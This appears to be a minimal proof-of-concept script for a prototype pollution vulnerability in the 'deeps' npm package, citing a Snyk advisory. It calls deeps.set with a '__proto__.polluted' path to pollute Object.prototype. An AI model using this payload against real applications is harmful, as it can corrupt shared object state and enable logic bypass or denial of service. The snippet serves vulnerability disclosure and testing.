//https://snyk.io/vuln/SNYK-JS-DEEPS-598667
const deeps = require("deeps");
deeps.set({}, "__proto__.polluted", "yes");
